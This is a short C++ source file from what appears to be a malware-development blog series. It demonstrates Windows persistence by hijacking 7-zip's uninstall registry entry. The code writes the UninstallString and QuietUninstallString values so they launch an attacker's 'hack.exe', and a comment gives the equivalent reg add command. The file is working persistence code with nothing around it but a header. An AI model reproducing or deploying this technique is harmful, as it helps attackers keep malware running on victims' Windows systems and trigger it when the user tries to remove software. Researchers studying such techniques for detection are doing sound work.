/*
pers.cpp
windows persistence via
hijacking uninstall app
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/04/malware-pers-13.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // target app
  const char* app = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";

  // evil app
  const char* exe = "C:\\Users\\User\\Documents\\malware\\2022-10-04-malware-pers-13\\hack.exe";

  // app
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update registry key value
    // reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
